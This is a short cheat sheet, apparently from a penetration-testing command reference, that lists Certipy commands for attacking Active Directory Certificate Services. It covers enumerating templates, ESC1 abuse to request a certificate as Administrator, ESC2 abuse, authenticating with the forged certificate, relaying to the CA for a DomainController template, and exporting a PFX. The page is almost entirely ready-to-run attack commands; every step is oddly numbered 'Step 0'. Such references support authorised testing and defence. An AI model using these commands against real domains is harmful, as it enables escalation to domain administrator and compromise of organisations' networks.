# Domain Penetration

_1 tool command_

### Certipy  `certipy-tool`
_ADCS certificate service attack tool_

**Step 0**
> Enumerate certificate services
_platform: linux_
```
certipy find -u user@domain.com -p password -dc-ip dc_ip
```

**Step 0**
> ESC1 template abuse
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template Template -upn Administrator@domain.com
```

**Step 0**
> ESC2 any purpose
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template VULNERABLE_TEMPLATE
```

**Step 0**
> Authenticate using certificate
_platform: linux_
```
certipy auth -pfx administrator.pfx -domain domain.com
```

**Step 0**
> HTTP relay attack
_platform: linux_
```
certipy relay -ca ca_server -template DomainController
```

**Step 0**
> Export PFX certificate
_platform: linux_
```
certipy req -u user@domain.com -p password -ca CA_NAME -template User -out user.pfx
```

---
